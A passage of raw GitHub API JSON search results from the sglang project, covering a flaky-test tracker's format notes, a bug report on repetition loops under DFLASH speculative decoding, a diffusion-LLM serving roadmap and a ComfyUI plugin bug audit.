[#41865](https://github.com/sgl-project/sglang/actions/runs/37636098052/job/112851419405) | open |\n\n## Format (v1)\n\nEach row is one failure mode, keyed by **Test** (or **Job / step**) plus **Signature**. The same test failing with a different signature gets its own row.\n\n- **ID**: `T<n>` for tests and `I<n>` for infra. IDs are never reused, even when a row is fixed or removed. Retired IDs: `I2`-`I10` (removed on 2026-10-08 because they were `Cancel Unfinished PR Runs` cancels).\n- **Test**: `path::Class::method`, with the path relative to the repo root. Use `path` alone if the method is unknown.\n- **Job / step**: the workflow job name, a slash, and the failing step or action.\n- **Signature**: the exception type and message, with run-specific values (numbers, paths, hashes, ports, timestamps) replaced by `<N>`, `<PATH>`, and so on. At most about 100 characters.\n- **Runner**: the runner label of the failing job, for example `1-gpu-h100` or `8-gpu-b300`.\n- **Seen**: the number of failed job attempts recorded. Each failed attempt counts once, including a failed rerun.\n- **Rerun passed**: `P/R`. `R` is the number of occurrences whose rerun has finished. `P` is how many of those reruns passed the same job with no code change.\n- **First seen** / **Last seen**: UTC dates (`YYYY-MM-DD`).\n- **Recent jobs**: links to the last 3 failing jobs, newest first. Each link is labeled with its PR number.\n- **Status**: `open`; `investigating (@user or #issue)`; or `fixed (#PR)`. If a `fixed` row fails again after the fix merged, it returns to `open` with `regressed after #PR`.\n\nRows are sorted by **Seen**, highest first. Ties are broken by **Last seen**, newest first.\n\nEvery occurrence is also posted as a comment on this issue. The comment starts with `<!-- sglang-flaky-occurrence:v1 -->` and holds the entry ID, PR, job link, why the failure is unrelated to the PR, and the rerun result. The comments are the append-only record, and the tables above are their summary.\n\n## For debugging agents\n\nStart from the top of each table. A test row with a high **Seen** count and a high **Rerun passed** ratio is a confirmed flake, and it is worth fixing or stabilizing. When you take a row, set its **Status** to `investigating (@you)`. When the fix merges, set it to `fixed (#PR)`.\n\n\n\n\n\n\n\n\n\n\n\n\n","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/42752/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/42752/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/40843","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/40843/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/40843/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/40843/events","html_url":"https://github.com/sgl-project/sglang/issues/40843","id":5548597134,"node_id":"I_kwDOLCAjRs8AAAABSrjfjg","number":40843,"title":"[Bug] Severe repetition and degenerate loops in reasoning/output when serving GLM-5.3 with DFLASH speculative decoding","user":{"login":"jianjungki","id":1188643,"node_id":"MDQ6VXNlcjExODg2NDM=","avatar_url":"https://avatars.githubusercontent.com/u/1188643?v=4","gravatar_id":"","url":"https://api.github.com/users/jianjungki","html_url":"https://github.com/jianjungki","followers_url":"https://api.github.com/users/jianjungki/followers","following_url":"https://api.github.com/users/jianjungki/following{/other_user}","gists_url":"https://api.github.com/users/jianjungki/gists{/gist_id}","starred_url":"https://api.github.com/users/jianjungki/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/jianjungki/subscriptions","organizations_url":"https://api.github.com/users/jianjungki/orgs","repos_url":"https://api.github.com/users/jianjungki/repos","events_url":"https://api.github.com/users/jianjungki/events{/privacy}","received_events_url":"https://api.github.com/users/jianjungki/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":15,"created_at":"2026-09-23T04:05:41Z","updated_at":"2026-10-15T08:58:16Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Checklist\n\n- [x] I searched related issues but found no solution.\n- [x] The bug persists in the latest version.\n- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.\n- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.\n- [x] Please use English. Otherwise, it will be closed.\n\n### Describe the bug\n\n### Describe the bug\n\nWhen serving `ZhipuAI/GLM-5___3-Flash` using DFLASH speculative decoding with `incoai/GLM-5___3-Flash-DFlash2`, the engine encounters severe token degeneration and repetition loops:\n\n1. **Reasoning / Chain-of-Thought Loop**: The model gets trapped in an infinite single-token generation loop, continuously emitting Chinese characters (e.g., repeating `资料资料资料...`) across the context until hitting limits.\n2. **Output Repetition Loop**: The generated response indefinitely loops identical structured markdown blocks (e.g., repeatedly outputting `实测 conclusion \\n 此轮的合规 conclusion: 我的搜索输出 = 我虚构的。`).\n\n### Reproduction\n\nLaunch SGLang server with the above arguments (GLM-5.3-Flash + DFLASH draft model).\n\nSend a generation request requiring reasoning/thinking (or long context retrieval).\n\nObserve the generated tokens / streaming response.\n\n### Environment\n\n\n\n#### 1. Hardware & System\n- **GPUs**: 8x NVIDIA H100 80GB HBM3 (Total: 81559 MiB per GPU)\n- **NVIDIA Driver Version**: `595.71.05`\n- **OS / Toolchain**: GCC 13.3.0\n\n#### 2. Software Versions & Python Packages\n- **Python**: `3.12.3`\n- **SGLang**: `0.5.20` (Executable: `/opt/sglang/bin/sglang`)\n- **PyTorch**: `2.13.0+cu130`\n- **Transformers**: `5.12.1`\n- **FlashInfer**: `0.6.18`\n- **TorchCodec**: `0.15.0+cu130`\n\n#### 3. Model Configurations & Metadata\n* **Target Model**:\n  - Path: `/mnt/models/ZhipuAI/GLM-5___3-Flash`\n  - Model Type / Arch: `glm5_next` / `Glm5NextForConditionalGeneration`\n  - Quantization: `fp8` (served with `dtype=\"bfloat16\"`)\n  - Hidden Layers: 45\n  - Max Position Embeddings: 1048576\n\n* **Draft Model (DFLASH)**:\n  - Path: `/mnt/models/incoai/GLM-5___3-Flash-DFlash2`\n  - Model Type / Arch: `qwen3` / `DFlash2DraftModel`\n  - Hidden Layers: 5\n  - DFlash Block Size: 8\n  - Dtype: `bfloat16`\n\n#### 4. Runtime & Attention Configuration\n- **TP Size**: 8\n- **Speculative Algorithm**: `DFLASH` (`speculative_num_draft_tokens: 8`, `speculative_num_steps: 1`)\n- **Attention Backend**: `dsa` (DeepSeek DSA with `dsa_prefill_backend='tilelang'`, `dsa_decode_backend='tilelang'`)\n- **Page Size**: 64\n- **Reasoning Parser**: `glm45`\n- **Tool Call Parser**: `glm47`","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/40843/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/40843/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/39499","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/39499/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/39499/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/39499/events","html_url":"https://github.com/sgl-project/sglang/issues/39499","id":5456346696,"node_id":"I_kwDOLCAjRs8AAAABRTk-SA","number":39499,"title":"[Roadmap] SGLang dLLM Serving","user":{"login":"rwang5203","id":11150595,"node_id":"MDQ6VXNlcjExMTUwNTk1","avatar_url":"https://avatars.githubusercontent.com/u/11150595?v=4","gravatar_id":"","url":"https://api.github.com/users/rwang5203","html_url":"https://github.com/rwang5203","followers_url":"https://api.github.com/users/rwang5203/followers","following_url":"https://api.github.com/users/rwang5203/following{/other_user}","gists_url":"https://api.github.com/users/rwang5203/gists{/gist_id}","starred_url":"https://api.github.com/users/rwang5203/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/rwang5203/subscriptions","organizations_url":"https://api.github.com/users/rwang5203/orgs","repos_url":"https://api.github.com/users/rwang5203/repos","events_url":"https://api.github.com/users/rwang5203/events{/privacy}","received_events_url":"https://api.github.com/users/rwang5203/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":20,"created_at":"2026-09-15T01:21:47Z","updated_at":"2026-10-15T03:13:20Z","closed_at":null,"assignee":null,"author_association":"COLLABORATOR","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"# Goal\n\nThis roadmap continues #14199, initiated by @ClawSeven, and builds on the community's work toward robust, efficient block-diffusion serving and Jev-style decisions on diffusion LLMs.\n\nCarry forward unfinished serving goals alongside newer work. Fixes for crashes and wrong results on main come before new features. Full-sequence models get baseline compatibility. Checked items record merged work. Unchecked items track remaining work or evaluation. Phases can overlap. Jev-style decisions on causal models are tracked separately, starting with #40826.\n\n# Roadmap\n\n### Phase 1: Shared runtime and request lifecycle\n\n- [ ] Complete shared scheduling support.\n\n  - [x] Dynamic batching. #14883\n  - [x] Prefill/decode separation. #17484\n  - [x] Algorithm-independent FDFO and early block departure. #27551\n  - [ ] Refine scheduling interfaces and isolate model behavior.\n  - [ ] FDFO + LowConfidence overlap scheduling. @Betelgeu #40756\n  - [ ] Extend overlap to other algorithms after state-lifetime qualification.\n  - [ ] Derive the default running-request count and graph capture sizes from available memory instead of serving one request at a time.\n\n- [ ] Fail early on unsupported configurations.\n\n  - [ ] Refuse speculative decoding, two-batch overlap, unsupported deterministic backends, and logprob requests. #43452\n  - [ ] Refuse or support attention data parallelism, which crashes today.\n  - [ ] Refuse or fix the FA3 attention backend, which crashes on the first request.\n  - [ ] Reject sampling and grammar fields that the selected algorithm does not apply.\n  - [ ] Reject unknown algorithm configuration keys instead of falling back to defaults.\n\n- [ ] Harden request lifecycle and caching.\n\n  - [x] Block-level radix caching. #18724\n  - [x] Retain block KV and request slots. #27877\n  - [x] Keep one request row across FDFO blocks. #42846\n  - [ ] Qualify aborted FDFO cleanup and retained KV recovery.\n  - [ ] Apply the waiting timeout to requests queued for dLLM scheduling. @lsnchow #42453\n  - [ ] Bound staging admission by block size and available capacity. #32992\n  - [ ] Fix the radix double count that stops an idle scheduler. #35781\n  - [ ] Settle how literal mask text and caller input IDs holding the mask id are handled. #35998\n  - [ ] Qualify committed streaming, EOS/stops, cancellation, and final assembly. @zxr-creator\n  - [ ] Define opt-in provisional output separately from committed streaming.\n\n### Phase 2: Prefill and CUDA graphs\n\n- [ ] Expand attention and prefill support.\n\n  - [ ] Round preparation and staging liveness, split from #31586.\n  - [ ] Multi-block pure prefill in eager mode.\n  - [ ] CUDA graphs for multi-block prefill through generic padded buckets.\n  - [ ] Native block-extend attention. FlashInfer #2722\n  - [ ] Block-extend attention adapter. #39739\n  - [ ] Custom and block-causal masks across backends. @0z5a #39703\n  - [ ] Preserve prefix-cache, prompt-tail, and literal-mask semantics. @0z5a #39592\n  - [ ] Mixed prefill/decode rounds. #33196\n\n- [ ] Extend CUDA graph coverage.\n\n  - [x] Fixed-block CUDA graphs. #14203\n  - [ ] Fit decode graph capture to memory without `--max-running-requests`. #40941\n  - [ ] Piecewise prefill graphs on compatible backends.\n  - [ ] Qualify variable-length prefill and graph buckets.\n\n### Phase 3: Models, decoding, and backends\n\n- [ ] Expand model support.\n\n  - [x] LLaDA2.0 model family. #12588\n  - [x] SDAR dense and MoE models. #19044\n  - [x] DiffusionGemma text and image-input serving. #34061\n  - [x] DiffusionGemma FA4 and CUDA graphs on Blackwell. #42239\n  - [ ] Route `sglang serve` dLLM launches to the LLM runtime. #40942\n  - [ ] Quantized DiffusionGemma checkpoints, FP8 first.\n  - [ ] Radix cache and chunked prefill for DiffusionGemma.\n  - [x] LLaDA2.2 block routing. #31768\n  - [x] LLaDA2.2 insertion/deletion decoding. #31773\n  - [ ] LLaDA2.2 routing and editing on Ascend. #32280\n  - [ ] Qualify LLaDA2.2 mini and 128K context with a documented launch command.\n  - [ ] Nemotron Labs Diffusion with its autoregressive, block-diffusion, and LinearSpec modes. #25803\n  - [ ] Dream full-sequence baseline. #36881\n  - [ ] Read block size, mask id, and default algorithm from checkpoint metadata.\n  - [ ] Qualify the Fast-dLLM v2 continuation and batching support. @SensenGao #22156\n  - [ ] GFusion model support. #29776\n  - [ ] LLaDA-Image as a related image-generation extension. #37907\n\n- [ ] Extend decoding support.\n\n  - [x] Threshold-based LowConfidence decoding. #14412\n  - [x] JointThreshold token editing. #18171\n  - [ ] Per-request temperature, top-p, and top-k sampling with greedy defaults unless the checkpoint sets others. @Dayuxiaoshui #41242\n  - [ ] Entropy-bounded sampling as a shared algorithm.\n  - [ ] Decoding step maps and deterministic seeds for RL rollout. #27943\n\n- [ ] Evaluate broader hardware and distributed serving.\n\n  - [x] AMD Triton backend. #15560\n  - [x] Ascend graph execution. #18485\n  - [ ] Qualify AMD AITER coverage.\n  - [ ] Qualify Ascend Triton coverage.\n  - [ ] Fix the Intel XPU warmup crash in `DLLM_EXTEND`. #42627\n  - [ ] Evaluate DPA support.\n  - [ ] Evaluate context parallelism.\n  - [ ] Evaluate pipeline parallelism.\n  - [ ] Evaluate attention/FFN disaggregation.\n\n### Phase 4: Kernels, profiling, and evaluation\n\n- [ ] Optimize kernels and runtime overhead.\n\n  - [x] FP8 SwapAB for eligible H20 MoE shapes. #15712\n  - [ ] Profile remaining MoE shapes and backends.\n  - [x] Vectorized JointThreshold with the NPU default. #21094\n  - [ ] Enable the vectorized JointThreshold CUDA default. #34122\n  - [ ] Adapt fused LowConfidence processing to the step interface. #18810\n  - [ ] Reuse block-attention and token-selection kernels.\n  - [ ] Fold the KV commit of a resolved block into the next block's first forward.\n  - [ ] Reduce NPU synchronization and KV allocation overhead. #33047\n  - [ ] Multi-step FDFO with latency qualification. #33190\n  - [ ] Reduce NPU vocabulary memory. #33161\n  - [ ] Compact TP-local vocabulary state. #39735\n\n- [ ] Extend compatible speculative-decoding support.\n\n  - [x] Domino draft rollout in DFlash V2. #36899\n  - [x] Tensor-parallel Domino rollout. #37069\n  - [ ] Evaluate further decoding methods and component reuse.\n\n- [ ] Expand metrics and validation.\n\n  - [x] Initial dLLM documentation. #14358\n  - [x] Initial accuracy and performance CI. #14723\n  - [ ] Sequence-level forward counts and tokens per forward, building on the closed proposal. #23722\n  - [ ] Cumulative and incremental streaming metric aggregation.\n  - [ ] Focused regression coverage for supported request and state boundaries.\n  - [ ] Nightly quality, latency, throughput, and memory checks under a frozen protocol.\n  - [ ] Matched comparisons with other dLLM serving engines using normal documented settings and all trial outcomes.\n\n### Phase 5: Jev-style decisions on diffusion LLMs\n\n- [ ] Add DiffusionGemma decision primitives in SRT. @Hangzhi #41232\n\n  - [ ] Pinned canvases, fixed answer slots, and bounded denoising steps.\n  - [ ] Completion-forward label logprobs through the existing output fields.\n  - [ ] A working example and cookbook section.\n\n- [ ] Qualify decision correctness and serving behavior.\n\n  - [ ] Verify mixed option counts, canvas sizes, and prompt boundaries.\n  - [ ] Verify batching, cancellation, resource limits, and request-state isolation.\n  - [ ] Separate normalized label probabilities from empirically validated decision confidence.\n  - [ ] Evaluate quality and calibration under a frozen, independently confirmed protocol.\n  - [ ] Measure latency, throughput, and memory under normal use without workload-specific tuning.\n\n- [ ] Revisit after demand evidence.\n\n  - [ ] A native sglang-diffusion decision pipeline, after an embedded SRT adapter lands. #37907\n  - [ ] Multi-question diffusion canvases with an explicit conditioning contract.\n  - [ ] Diffusion-compatible grammar-constrained JSON.\n  - [ ] A decision API shared with the causal track. #41712","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/39499/reactions","total_count":5,"+1":4,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":1},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/39499/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/43874","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/43874/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/43874/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/43874/events","html_url":"https://github.com/sgl-project/sglang/issues/43874","id":5817415956,"node_id":"I_kwDOLCAjRs8AAAABWr65FA","number":43874,"title":"[Bug] [diffusion] ComfyUI plugin: integrated-mode bugs in GGUF detection, import guard and VRAM accounting","user":{"login":"OnePunchMonk","id":119044997,"node_id":"U_kgDOBxh7hQ","avatar_url":"https://avatars.githubusercontent.com/u/119044997?v=4","gravatar_id":"","url":"https://api.github.com/users/OnePunchMonk","html_url":"https://github.com/OnePunchMonk","followers_url":"https://api.github.com/users/OnePunchMonk/followers","following_url":"https://api.github.com/users/OnePunchMonk/following{/other_user}","gists_url":"https://api.github.com/users/OnePunchMonk/gists{/gist_id}","starred_url":"https://api.github.com/users/OnePunchMonk/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/OnePunchMonk/subscriptions","organizations_url":"https://api.github.com/users/OnePunchMonk/orgs","repos_url":"https://api.github.com/users/OnePunchMonk/repos","events_url":"https://api.github.com/users/OnePunchMonk/events{/privacy}","received_events_url":"https://api.github.com/users/OnePunchMonk/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-10-12T16:55:34Z","updated_at":"2026-10-14T10:01:38Z","closed_at":null,"assignee":null,"author_association":"CONTRIBUTOR","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Checklist\n\n- [x] I searched related issues but found no solution.\n- [x] The bug persists in the latest version.\n- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.\n- [x] Please use English. Otherwise, it will be closed.\n\n### Describe the bug\n\nIntegrated-mode bugs in the ComfyUI plugin (`python/sglang/multimodal_gen/apps/ComfyUI_SGLDiffusion/`), found in an audit. Each one was confirmed against the pre-fix code.\n\n1. GGUF detection is hardcoded to MiniMax-H3: any `.gguf` is treated as H3, so a Flux / Qwen / Z-Image GGUF fails with an H3 error or loads H3 around the wrong weights. Fix: read the GGUF header with `read_gguf_tensor_meta()` and run ComfyUI's detection on its tensor names and logical shapes, as is done for safetensors (no companion file).\n2. `SGLDUNETLoader` adds `.gguf` to ComfyUI's global `diffusion_models` registry at import, so the stock \"Load Diffusion Model\" node offers GGUF files it cannot load.\n3. `get_comfyui_model` returns a bare `None` on detection failure, so callers fail with \"cannot unpack non-iterable NoneType object\" instead of the real error.\n4. `executors/minimax_h3.py` imports the runtime unguarded, and `__init__.py` swallows the `ImportError` without logging, so every node disappears from ComfyUI with no message.\n5. ~~`SGLDModelPatcher.model_size()` VRAM accounting~~ Moved to #44084 / #44086 per review: on its own it makes things worse (`loaded_size()` stays 0, so ComfyUI would try to free the full model size on every sampling run).\n\n### Reproduction\n\nEach bug was reproduced against the pre-fix plugin code with a regression test (stubbed `comfy` / `folder_paths`, no GPU needed). Fix: #43536\n\n### Related\n\nThe original audit also found issues that are now tracked separately:\n\n- Server-mode bugs: #44083 (fix: #44082)\n- Freeing the worker's GPU memory on ComfyUI unload (feature): #44084 (PR: #44086)\n- `enable_cache_dit` only applying to MiniMax-H3: handled per run by #43696\n\n### Environment\n\nsglang main, ComfyUI plugin `python/sglang/multimodal_gen/apps/ComfyUI_SGLDiffusion/`. Unit tests on CPU-only Linux.\n","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/43874/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/43874/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0}],"search_type":"lexical"}